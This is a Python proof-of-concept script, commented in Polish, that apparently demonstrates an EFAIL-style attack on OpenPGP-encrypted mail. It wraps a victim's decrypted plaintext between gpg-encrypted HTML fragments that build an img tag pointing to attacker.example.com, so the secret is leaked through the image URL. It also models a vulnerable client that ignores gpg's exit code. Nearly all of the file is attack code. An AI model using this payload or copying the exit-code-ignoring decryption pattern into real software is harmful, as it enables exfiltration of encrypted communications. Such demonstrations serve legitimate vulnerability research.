import subprocess

PASSPHRASE = "test1234"

prefix_html = b'<img src="https://attacker.example.com/x?d='
suffix_html = b'">'

def encrypt_part(plaintext_bytes, filename):
    subprocess.run(
        ["gpg", "--symmetric", "--rfc2440",
         "--cipher-algo", "AES256", "--compress-algo", "none",
         "--allow-old-cipher-algos", "--batch",
         "--passphrase", PASSPHRASE,
         "--output", filename],
        input=plaintext_bytes, check=True, capture_output=True
    )

def vulnerable_client_decrypt(filename):
    """Podatny klient: czyta stdout, IGNORUJE exit code."""
    proc = subprocess.run(
        ["gpg", "--batch", "--passphrase", PASSPHRASE,
         "--allow-old-cipher-algos", "--decrypt", filename],
        capture_output=True
    )
    return proc.stdout  

encrypt_part(prefix_html, "attacker_prefix.gpg")
encrypt_part(suffix_html, "attacker_suffix.gpg")

part1 = vulnerable_client_decrypt("attacker_prefix.gpg")
part2 = vulnerable_client_decrypt("test_rfc2440.gpg")
part3 = vulnerable_client_decrypt("attacker_suffix.gpg")

combined_html = part1 + part2 + part3
print("Połączony HTML (po deszyfracji przez ofiarę):")
print(combined_html.decode())